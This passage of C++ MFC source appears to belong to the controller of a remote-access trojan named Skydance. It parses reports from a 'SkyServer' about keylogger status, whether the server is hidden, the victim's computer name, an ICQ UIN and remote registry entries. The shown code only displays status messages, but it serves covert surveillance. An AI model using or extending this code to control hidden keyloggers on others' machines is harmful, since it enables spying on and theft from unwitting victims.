			if(part[3] == "1") {m_cDlgSpecial.m_bKeyLogAlways = TRUE; m_pLeftRecView->AddEvent("KeyLog is active", 3);}
			else {m_cDlgSpecial.m_bKeyLogAlways = FALSE; m_pLeftRecView->AddEvent("KeyLog is not active", 3);}
			return;
		}
		if(part[0] == "ServerInfo")
		{
			if(part[1] == "1") {m_cDlgSpecial.m_bDlgVisible = TRUE;	m_pLeftRecView->AddEvent("Server is visible", 3);}
			else {m_cDlgSpecial.m_bDlgVisible = FALSE; m_pLeftRecView->AddEvent("Server is hidden", 3);}
			m_cDlgSpecial.m_sComputerName = part[2];
			m_pLeftRecView->AddEvent("ComputerName: " + part[2], 3);
			//m_cDlgSpecial.m_sFileName = part[3];
			m_pLeftRecView->AddEvent("Current executed SkyServer: " + part[3], 3);
			m_cDlgSpecial.m_sUIN = part[4];
			m_pLeftRecView->AddEvent("Current ICQ-UIN: " + part[4], 3);
			return;
		}
		if(part[0] == "CurrentUIN")	//veraltet... von ServerInfo übernommen...
		{
			m_pLeftRecView->AddEvent("ICQ-UIN is: " + part[1], 3);	
			m_cDlgSpecial.m_sUIN = part[1];
			return;
		}
		if(part[0] == "RegEdit")
		{
			
			m_cDlgReg.m_lstReg.AddString(">" + part[1]);
			//m_pLeftRecView->AddEvent("ICQ-UIN is: " + part[1], 3);	
			return;
		}

		m_pLeftRecView->AddEvent(strToAnalyse, 3);
	}
}

void CSkydanceDoc::CleanAllViews()	//bis jetzt nur den tree
{
	m_pLeftView->CleanView();	//unbedingt immer auf den richtigen view zeigen!
	m_pSkydanceView->CleanView();
}

void CSkydanceDoc::UpdateOtherViews()//eventuell wieder löschen...
{
	UpdateAllViews(NULL);	
}



